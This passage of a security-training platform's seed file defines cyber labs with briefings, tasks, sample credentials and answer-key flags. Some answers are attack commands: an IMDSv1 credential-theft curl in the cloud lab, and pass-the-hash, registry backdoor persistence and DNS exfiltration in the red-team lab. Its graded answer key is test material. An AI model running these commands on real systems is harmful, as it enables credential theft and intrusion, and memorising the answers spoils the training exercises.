    description: "Perform penetration tests on cloud infrastructure within authorized scope.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1000,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Identify cloud-specific attack paths including IAM exploitation, metadata attacks, and storage enumeration.

### Environment
- Ubuntu 22.04 with Pacu/ScoutSuite
- Cloud penetration testing tools
- Credentials: cloud-pentest / cptest-2024!

### Tasks
1. Enumerate cloud resources using Pacu
2. Exploit IMDSv1 for credential theft from EC2
3. Identify overly permissive IAM roles for privilege escalation
4. Enumerate and access exposed S3 buckets
5. Exploit cross-account access for lateral movement
6. Test Lambda function security and environment variables
7. Audit cloud security configuration with ScoutSuite
8. Document cloud-specific findings and remediation

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Enumerate cloud resources using Pacu", "Exploit IMDSv1 for credential theft from EC2", "Identify overly permissive IAM roles for privilege escalation", "Enumerate and access exposed S3 buckets", "Exploit cross-account access for lateral movement", "Test Lambda function security and environment variables", "Audit cloud security configuration with ScoutSuite", "Document cloud-specific findings and remediation"],
    credentials: [
      { service: "container", username: "cloud-pentest", password: "cptest-2024!"}
    ],
    flags: [
      { title: "Pacu Enumerator", description: "Enumerate with Pacu", correctAnswer: "pacu --module iam__enum_users_roles_policies_groups", points: 150},
      { title: "IMDS Exploiter", description: "Exploit IMDSv1", correctAnswer: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/", points: 250},
      { title: "IAM Escalator", description: "Escalate via IAM role", correctAnswer: "Assume role with existing credentials to gain elevated access", points: 250},
      { title: "S3 Enumeratior", description: "Enumerate S3 buckets", correctAnswer: "aws s3 ls s3://target-bucket --recursive --profile compromised", points: 200},
      { title: "ScoutSuite Auditor", description: "Audit with ScoutSuite", correctAnswer: "scout aws --profile pentest-account --report-dir reports/", points: 150}
    ],
  },
  {
    title: "Red Team Operations",
    description: "Simulate advanced persistent threats (APTs) using red team tactics.",
    dockerImage: "parrotsec/security",
    difficulty: 1050,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Execute red team operations including initial access, persistence, and command & control.

### Environment
- Parrot Security OS with C2 framework
- Red team tooling
- Credentials: redteam / redops-2024!

### Tasks
1. Establish initial access through phishing simulation
2. Deploy fileless malware using PowerShell cradles
3. Set up command & control (C2) infrastructure
4. Perform lateral movement using pass-the-hash
5. Establish persistence through registry and scheduled tasks
6. Exfiltrate data using encrypted DNS tunneling
7. Evade detection using living-off-the-land binaries
8. Create after-action report with detection opportunities

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Establish initial access through phishing simulation", "Deploy fileless malware using PowerShell cradles", "Set up command & control (C2) infrastructure", "Perform lateral movement using pass-the-hash", "Establish persistence through registry and scheduled tasks", "Exfiltrate data using encrypted DNS tunneling", "Evade detection using living-off-the-land binaries", "Create after-action report with detection opportunities"],
    credentials: [
      { service: "ssh", username: "redteam", password: "redops-2024!"}
    ],
    flags: [
      { title: "Phisher", description: "Execute phishing campaign", correctAnswer: "GoPhish campaign with credential harvesting", points: 200},
      { title: "C2 Deployer", description: "Set up C2 infrastructure", correctAnswer: "Sliver/Mythic C2 server with malleable C2 profiles", points: 250},
      { title: "PassTheHash", description: "Lateral movement via PtH", correctAnswer: "impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH target", points: 250},
      { title: "Persistence Setter", description: "Establish persistence", correctAnswer: "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor", points: 200},
      { title: "Exfiltrator", description: "Exfiltrate via DNS", correctAnswer: "dnscat2 tunnel with data encoding in DNS queries", points: 200}
    ],
  },
  {
    title: "Blue Team Detection & Response",
    description: "Detect and respond to security incidents using blue team techniques.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1100,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Identify indicators of compromise (IOCs), perform log analysis, and execute incident response.

### Environment
- Ubuntu 22.04 with SIEM tools
- Memory forensics (Volatility)
- Credentials: blueteam / bluedetect-2024!

### Tasks
1. Analyze Windows Event Logs for signs of compromise
2. Perform memory forensics with Volatility for malware detection
3. Create detection rules for common attack patterns
4. Implement honeytokens for intrusion detection
5. Analyze network traffic for C2 communication patterns
6. Develop YARA rules for malware detection
7. Practice incident response with tabletop exercises
8. Create threat hunting hypotheses and validate with data

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Analyze Windows Event Logs for signs of compromise", "Perform memory forensics with Volatility for malware detection", "Create detection rules for common attack patterns", "Implement honeytokens for intrusion detection", "Analyze network traffic for C2 communication patterns", "Develop YARA rules for malware detection", "Practice incident response with tabletop exercises", "Create threat hunting hypotheses and validate with data"],
    credentials: [
      { service: "container", username: "blueteam", password: "bluedetect-2024!"}
    ],
    flags: [
      { title: "Log Analyzer", description: "Analyze event logs", correctAnswer: "grep -E '4625|4672|4720' /var/log/auth.log", points: 150},
      { title: "Memory Forensics", description: "Volatility memory analysis", correctAnswer: "volatility -f memory.dump --profile=Win10x64 pslist", points: 250},
      { title: "YARA Creator", description: "Create YARA rule", correctAnswer: "rule malware { strings: $s1 = {48 89 E5 48 83 EC 20} condition: $s1 }", points: 200},
      { title: "Honeytoken Deployer", description: "Deploy honeytokens", correctAnswer: "Create fake admin account with monitoring on authentication attempts", points: 200},
      { title: "Threat Hunter", description: "Hunt for threats", correctAnswer: "Hypothesis: Unusual outbound DNS queries on port 53 to non-standard resolvers", points: 200}
    ],
  },
  {
    title: "Digital Forensics & Incident Response",
    description: "Perform digital forensics analysis and incident response investigations.",
    dockerImage: "parrotsec/security",
    difficulty: 1150,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Collect and analyze digital evidence, perform memory forensics, and reconstruct attack timelines.

### Environment
- Parrot Security OS with forensic tools
- Volatility, Autopsy, Sleuth Kit
- Credentials: root / forensics-2024!

### Tasks
1. Perform disk image acquisition using dd and dc3dd
2. Analyze file system artifacts with Sleuth Kit
3. Recover deleted files and analyze file system metadata
4. Perform memory forensics for running process analysis
5. Extract browser history and artifacts for timeline
6. Analyze Windows Registry hives for user activity
7. Reconstruct attack timeline from multiple evidence sources
8. Create forensic report suitable for legal proceedings

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Perform disk image acquisition using dd and dc3dd", "Analyze file system artifacts with Sleuth Kit", "Recover deleted files and analyze file system metadata", "Perform memory forensics for running process analysis", "Extract browser history and artifacts for timeline", "Analyze Windows Registry hives for user activity", "Reconstruct attack timeline from multiple evidence sources", "Create forensic report suitable for legal proceedings"],
    credentials: [
      { service: "container", username: "root", password: "forensics-2024!"}
    ],
    flags: [
      { title: "Image Acquirer", description: "Create disk image", correctAnswer: "dd if=/dev/sda of=disk.img bs=4M conv=sync,noerror status=progress", points: 150},
      { title: "TSK Analyzer", description: "Analyze with Sleuth Kit", correctAnswer: "fls -r disk.img | grep -i 'deleted\\|recent'", points: 200},
      { title: "File Recoverer", description: "Recover deleted files", correctAnswer: "photorec disk.img", points: 200},
      { title: "Reg Analyzer", description: "Analyze Windows Registry", correctAnswer: "reglookup disk.img | grep -i 'UserAssist\\|RecentDocs'", points: 250},
      { title: "Timeline Builder", description: "Build forensic timeline", correctAnswer: "plaso -o timeline.jsonl disk.img && log2timeline timeline.jsonl", points: 200}
    ],
  },
  {
    title: "Security Orchestration & Automated Response (SOAR)",
    description: "Implement SOAR platforms for automated security incident response.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1200,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Deploy Shuffle SOAR and create automated playbooks for common security incidents.

### Environment
- Ubuntu 22.04 with Shuffle SOAR
- Integration APIs for security tools
- Credentials: soar-admin / soar-sec-2024!

### Tasks
1. Deploy Shuffle SOAR platform with Docker
2. Create automated playbooks for phishing email response
3. Implement IP reputation checking automation
4. Build malware analysis sandbox integration
5. Create vulnerability scan automation workflows
6. Implement ticket creation and notification systems
7. Build custom integrations for internal security tools
8. Test automated response playbooks with simulation

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Deploy Shuffle SOAR platform with Docker", "Create automated playbooks for phishing email response", "Implement IP reputation checking automation", "Build malware analysis sandbox integration", "Create vulnerability scan automation workflows", "Implement ticket creation and notification systems", "Build custom integrations for internal security tools", "Test automated response playbooks with simulation"],
    credentials: [
      { service: "container", username: "soar-admin", password: "soar-sec-2024!"}
    ],
    flags: [
      { title: "SOAR Deployer", description: "Deploy Shuffle SOAR", correctAnswer: "docker-compose up -d shuffle api frontend", points: 150},
      { title: "Phishing Playbook", description: "Create phishing response playbook", correctAnswer: "Email received -> Extract indicators -> Check reputation -> Block IOCs -> Notify user", points: 200},
      { title: "IP Checker", description: "Automated IP reputation check", correctAnswer: "Query VirusTotal, AbuseIPDB, Shodan APIs for IP reputation", points: 200},
      { title: "Malware Sandbox", description: "Integrate malware analysis", correctAnswer: "Submit file to ANY.RUN or Cuckoo sandbox, extract results", points: 250},
      { title: "Ticket Creator", description: "Automated ticket creation", correctAnswer: "Create Jira/ServiceNow ticket with incident details and severity", points: 200}
    ],
  },
  {
    title: "Bug Bounty Methodology & Reporting",
    description: "Master bug bounty methodology for responsible vulnerability disclosure.",
    dockerImage: "parrotsec/security",
    difficulty: 1250,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Execute structured bug bounty methodology from reconnaissance to report submission.

### Environment
- Parrot Security OS with recon tools
- Bug bounty platform access
- Credentials: hunter / bugbounty-2024!

### Tasks
1. Perform comprehensive subdomain enumeration
2. Identify hidden attack surfaces through JavaScript analysis
3. Test for business logic vulnerabilities in web applications
4. Chain low-severity findings for higher impact
5. Discover API endpoints not listed in documentation
6. Perform blind SSRF testing through collaboration features
7. Write clear and reproducible vulnerability reports
8. Navigate bug bounty program rules and scope boundaries

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Perform comprehensive subdomain enumeration", "Identify hidden attack surfaces through JavaScript analysis", "Test for business logic vulnerabilities in web applications", "Chain low-severity findings for higher impact", "Discover API endpoints not listed in documentation", "Perform blind SSRF testing through collaboration features", "Write clear and reproducible vulnerability reports", "Navigate bug bounty program rules and scope boundaries"],
    credentials: [
      { service: "ssh", username: "hunter", password: "bugbounty-2024!"}
    ],
    flags: [
      { title: "Subdomain Finder", description: "Enumerate subdomains", correctAnswer: "subfinder -d target.com -all | httpx -silent | tee subdomains.txt", points: 150},
      { title: "JS Analyzer", description: "Analyze JavaScript files", correctAnswer: "catjs | grep -E 'api|secret|token|key|password'", points: 200},
      { title: "Logic Bug Finder", description: "Find business logic flaws", correctAnswer: "Test workflow: create order -> modify quantity -> apply discount -> complete", points: 250},
      { title: "API Discoverer", description: "Discover hidden API endpoints", correctAnswer: "ffuf -u https://target.com/api/FUZZ -w api-wordlist.txt -mc 200", points: 200},
      { title: "Report Writer", description: "Write bug bounty report", correctAnswer: "Title, severity, steps to reproduce, impact, fix recommendation", points: 200}
    ],
  },
  {
    title: "Compliance Testing & Security Auditing",
    description: "Perform security compliance testing against industry standards.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1300,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Automate compliance checks against CIS benchmarks, PCI DSS, and SOC 2 requirements.

### Environment
- Ubuntu 22.04 with compliance tools
- CIS-CAT, OpenSCAP
- Credentials: auditor / compliance-sec-2024!

### Tasks
1. Run CIS Benchmark scan against Ubuntu server
2. Perform PCI DSS compliance assessment
3. Automate SOC 2 control evidence collection
4. Test HIPAA technical safeguards implementation
5. Implement continuous compliance monitoring
6. Create compliance gap analysis report
7. Set up automated remediation for non-compliant configurations
8. Prepare for external audit with evidence packages

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Run CIS Benchmark scan against Ubuntu server", "Perform PCI DSS compliance assessment", "Automate SOC 2 control evidence collection", "Test HIPAA technical safeguards implementation", "Implement continuous compliance monitoring", "Create compliance gap analysis report", "Set up automated remediation for non-compliant configurations", "Prepare for external audit with evidence packages"],
    credentials: [
      { service: "container", username: "auditor", password: "compliance-sec-2024!"}
    ],
    flags: [
      { title: "CIS Scanner", description: "Run CIS Benchmark scan", correctAnswer: "cis-cat --profile Level2_Server -r /opt/cis/ -o html", points: 150},
      { title: "PCI Checker", description: "PCI DSS compliance check", correctAnswer: "openscap oval eval --results pci-results.xml pci-dss-oval.xml", points: 200},
      { title: "SOC2 Collector", description: "Collect SOC 2 evidence", correctAnswer: "automate-control-evidence --framework soc2 --output evidence/", points: 200},
      { title: "HIPAA Tester", description: "Test HIPAA safeguards", correctAnswer: "check HIPAA security rule 164.312 - access control, audit controls, integrity", points: 200},
      { title: "Gap Analyzer", description: "Analyze compliance gaps", correctAnswer: "compare scan results against baseline, identify gaps, prioritize remediation", points: 200}
    ],
  },
  {
    title: "Nginx Security Hardening",
    description: "Harden Nginx web server configurations against common attack vectors.",
    dockerImage: "nginx:1.27-alpine",
    difficulty: 800,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Configure Nginx security headers, rate limiting, and access controls for production deployments.

### Environment
- Nginx 1.27 Alpine with sample application
- SSL certificates for testing
- Credentials: root / nginx-sec-2024!

### Tasks
1. Configure security headers (CSP, X-Frame-Options, X-Content-Type-Options)
2. Implement rate limiting for API and login endpoints
3. Set up connection limiting per IP address
4. Configure SSL/TLS with modern cipher suites
5. Enable OCSP stapling for certificate validation
6. Implement request body size limits to prevent DoS
7. Set up access logging for security monitoring
8. Configure worker process limits and resource allocation

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Configure security headers (CSP, X-Frame-Options, X-Content-Type-Options)", "Implement rate limiting for API and login endpoints", "Set up connection limiting per IP address", "Configure SSL/TLS with modern cipher suites", "Enable OCSP stapling for certificate validation", "Implement request body size limits to prevent DoS", "Set up access logging for security monitoring", "Configure worker process limits and resource allocation"],
    credentials: [
      { service: "container", username: "root", password: "nginx-sec-2024!"}
    ],
    flags: [
      { title: "Header Hardener", description: "Configure security headers", correctAnswer: "add_header X-Content-Type-Options nosniff; add_header X-Frame-Options DENY; add_header Content-Security-Policy default-src 'self';", points: 150},
      { title: "Rate Limiter", description: "Implement rate limiting", correctAnswer: "limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;", points: 200},
      { title: "Conn Limiter", description: "Limit connections", correctAnswer: "limit_conn_zone $binary_remote_addr zone=addr:10m; limit_conn addr 10;", points: 200},
      { title: "SSL Hardener", description: "Harden SSL configuration", correctAnswer: "ssl_protocols TLSv1.2 TLSv1.3; ssl_prefer_server_ciphers on; ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA512;", points: 200},
      { title: "Body Limiter", description: "Set request body limit", correctAnswer: "client_max_body_size 10m; client_body_buffer_size 1k;", points: 150}
    ],
  },
  {
    title: "Apache HTTP Server Security",
    description: "Secure Apache HTTP Server with modules and configuration hardening.",
    dockerImage: "ubuntu:22.04",
    difficulty: 850,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Implement ModSecurity, security modules, and harden Apache configurations against attacks.

### Environment
- Ubuntu 22.04 with Apache 2.4
- ModSecurity WAF module
- Credentials: root / apache-sec-2024!

### Tasks
1. Install and configure ModSecurity with OWASP CRS
2. Enable security modules (mod_headers, mod_rewrite, mod_security)
3. Configure directory listing restrictions
4. Set up .htaccess authentication for sensitive areas
5. Implement IP-based access controls
6. Configure server signature hiding
7. Enable request filtering for common attack patterns
8. Set up log rotation and secure log permissions

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Install and configure ModSecurity with OWASP CRS", "Enable security modules (mod_headers, mod_rewrite, mod_security)", "Configure directory listing restrictions", "Set up .htaccess authentication for sensitive areas", "Implement IP-based access controls", "Configure server signature hiding", "Enable request filtering for common attack patterns", "Set up log rotation and secure log permissions"],
    credentials: [
      { service: "container", username: "root", password: "apache-sec-2024!"}
    ],
    flags: [
      { title: "ModSec Enabler", description: "Enable ModSecurity", correctAnswer: "LoadModule security2_module modules/mod_security2.so", points: 150},
      { title: "CRS Installer", description: "Install OWASP CRS", correctAnswer: "Include modsecurity-crs/crs-setup.conf", points: 150},
      { title: "Dir Hider", description: "Hide directory listings", correctAnswer: "Options -Indexes", points: 100},
      { title: "Auth Configurer", description: "Set up .htaccess auth", correctAnswer: "AuthType Basic AuthName 'Restricted' AuthUserFile /etc/apache/.htpasswd Require valid-user", points: 200},
      { title: "Sig Hider", description: "Hide server signature", correctAnswer: "ServerTokens Prod ServerSignature Off", points: 100}
    ],
  },
  {
    title: "Reverse Proxy & Load Balancer Security",
    description: "Secure reverse proxy and load balancer configurations for high availability.",
    dockerImage: "nginx:1.27-alpine",
    difficulty: 950,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Configure secure reverse proxy, health checks, and DDoS protection at the load balancer level.

### Environment
- Nginx or HAProxy as reverse proxy
- Multiple backend servers for load balancing
- Credentials: root / proxy-sec-2024!

### Tasks
1. Configure secure reverse proxy with upstream backend pools
2. Implement health checks for backend server monitoring
3. Set up WebSocket proxying with connection limits
4. Configure rate limiting at the load balancer level
5. Enable request buffering to protect backend servers
6. Implement IP allowlisting for admin endpoints
7. Set up DDoS protection with connection timeouts
8. Configure logging for security events

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Configure secure reverse proxy with upstream backend pools", "Implement health checks for backend server monitoring", "Set up WebSocket proxying with connection limits", "Configure rate limiting at the load balancer level", "Enable request buffering to protect backend servers", "Implement IP allowlisting for admin endpoints", "Set up DDoS protection with connection timeouts", "Configure logging for security events"],
    credentials: [
      { service: "container", username: "root", password: "proxy-sec-2024!"}
    ],
    flags: [
      { title: "Proxy Configurer", description: "Configure reverse proxy", correctAnswer: "proxy_pass http://backend; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr;", points: 150},
      { title: "Health Checker", description: "Configure health checks", correctAnswer: "health_check interval=5 fails=3 passes=2", points: 150},
      { title: "WebSocket Proxier", description: "Proxy WebSocket connections", correctAnswer: "proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection 'upgrade';", points: 200},
      { title: "Buffer Configurer", description: "Enable request buffering", correctAnswer: "proxy_buffering on; proxy_buffer_size 4k; proxy_buffers 8 4k;", points: 200},
      { title: "DDoS Protector", description: "Configure DDoS protection", correctAnswer: "proxy_connect_timeout 10s; proxy_send_timeout 10s; proxy_read_timeout 10s;", points: 150}
    ],
  },
  {
    title: "Web Server Log Analysis & Threat Detection",
    description: "Analyze web server logs for security threats and attack patterns.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1000,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Use GoAccess, ELK, and custom scripts to detect attacks from web server access logs.

### Environment
- Ubuntu 22.04 with GoAccess
- Log analysis tools
- Credentials: root / weblog-sec-2024!

### Tasks
1. Analyze access logs with GoAccess for real-time statistics
2. Detect SQL injection attempts in request parameters
3. Identify XSS attack patterns in user-agent strings
4. Find directory traversal attempts in URL paths
5. Detect brute-force attacks from login endpoint logs
6. Identify scanners and bots from user-agent analysis
7. Set up real-time alerting for suspicious patterns
8. Create automated log analysis reports

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Analyze access logs with GoAccess for real-time statistics", "Detect SQL injection attempts in request parameters", "Identify XSS attack patterns in user-agent strings", "Find directory traversal attempts in URL paths", "Detect brute-force attacks from login endpoint logs", "Identify scanners and bots from user-agent analysis", "Set up real-time alerting for suspicious patterns", "Create automated log analysis reports"],
    credentials: [
      { service: "container", username: "root", password: "weblog-sec-2024!"}
    ],
    flags: [
      { title: "GoAccess Analyzer", description: "Analyze logs with GoAccess", correctAnswer: "goaccess access.log --log-format=COMBINED -o report.html", points: 150},
      { title: "SQLi Detector", description: "Detect SQL injection in logs", correctAnswer: "grep -iE '(union|select|insert|drop|update).*from' access.log", points: 200},
      { title: "XSS Detector", description: "Detect XSS in user-agent", correctAnswer: "grep -i '<script\\|javascript\\|onerror' access.log", points: 200},
      { title: "Traversal Detector", description: "Detect directory traversal", correctAnswer: "grep -iE '\\.\\./\\.\\.|%2e%2e' access.log", points: 200},
      { title: "Brute-Force Detector", description: "Detect brute-force attacks", correctAnswer: "awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20", points: 150}
    ],
  },
  {
    title: "Web Server Hardening CIS Benchmark",
    description: "Implement CIS Benchmark hardening for production web servers.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1100,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Apply CIS Ubuntu/Linux benchmark and web server specific hardening measures.

### Environment
- Ubuntu 22.04 with web server
- CIS-CAT or manual audit tools
- Credentials: root / webhard-sec-2024!

### Tasks
1. Apply CIS Ubuntu 22.04 Level 2 benchmark settings
2. Harden SSH configuration per CIS guidelines
3. Configure file permissions for web content directories
4. Implement audit logging for web server access
5. Set up automatic security updates
6. Configure firewall rules per CIS recommendations
7. Harden kernel parameters for web server workload
8. Verify all hardening measures with automated scan

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Apply CIS Ubuntu 22.04 Level 2 benchmark settings", "Harden SSH configuration per CIS guidelines", "Configure file permissions for web content directories", "Implement audit logging for web server access", "Set up automatic security updates", "Configure firewall rules per CIS recommendations", "Harden kernel parameters for web server workload", "Verify all hardening measures with automated scan"],
    credentials: [
      { service: "container", username: "root", password: "webhard-sec-2024!"}
    ],
    flags: [
      { title: "CIS Applicator", description: "Apply CIS benchmark", correctAnswer: "Apply: Disable unused filesystems, configure audit rules, set password policies", points: 200},
      { title: "SSH Hardener", description: "Harden SSH per CIS", correctAnswer: "PermitRootLogin no; PasswordAuthentication no; Protocol 2; MaxAuthTries 3", points: 200},
      { title: "Perm Fixer", description: "Fix file permissions", correctAnswer: "chmod 644 /etc/nginx/*.conf; chown root:root /etc/nginx/*.conf", points: 150},
      { title: "Audit Logger", description: "Enable audit logging", correctAnswer: "auditctl -w /etc/nginx/ -p wa -k nginx_config", points: 200},
      { title: "Auto Updater", description: "Configure automatic updates", correctAnswer: "apt-get install -y unattended-upgrades && dpkg-reconfigure unattended-upgrades", points: 150}
    ],
  }
];

export async function seedEnrichLabs(prisma: PrismaClient, encryptionKey: string) {
  console.log('  === Seeding 118 enriched labs ===');
  console.log(`  Encryption key provided: ${encryptionKey ? 'yes' : 'no'}`);

  const BATCH_SIZE = 10;
  let created = 0;
  let skipped = 0;

  for (let i = 0; i < labs.length; i += BATCH_SIZE) {
    const batch = labs.slice(i, i + BATCH_SIZE);
    const batchNum = Math.floor(i / BATCH_SIZE) + 1;
    const totalBatches = Math.ceil(labs.length / BATCH_SIZE);
    console.log(`
  [Batch ${batchNum}/${totalBatches}] Processing labs ${i + 1} to ${Math.min(i + BATCH_SIZE, labs.length)}...`);

    for (const lab of batch) {
      try {
        const existing = await prisma.lab.findFirst({ where: { title: lab.title } });
        if (existing) {
          console.log(`    Skipped (exists): ${lab.title}`);
          skipped++;
          continue;
        }

        const createdLab = await prisma.lab.create({
          data: {
            title: lab.title,
            description: lab.description,
            dockerImage: lab.dockerImage,
            briefing: lab.briefing,
            tasks: lab.tasks,
            credentials: encryptCredentials(lab.credentials),
            imageUrl: '/images/labs/default.png',
            difficulty: lab.difficulty,
            estimatedMinutes: lab.estimatedMinutes,
          },
        });

        for (const flag of lab.flags) {
          await prisma.labFlag.create({
            data: {
              labId: createdLab.id,
              title: flag.title,
              description: flag.description,
              correctAnswer: await hashAnswer(flag.correctAnswer),
              points: flag.points,
            },
          });
        }

        console.log(`    Created: ${lab.title} (${lab.flags.length} flags)`);
        created++;
      } catch (error) {
        console.error(`    Error creating lab "${lab.title}":`, error);
      }
    }
  }

  console.log(`
  === Lab seeding complete ===`);
  console.log(`  Created: ${created} labs`);
  console.log(`  Skipped: ${skipped} labs (already exist)`);
  console.log(`  Total: ${created + skipped} labs processed`);
}
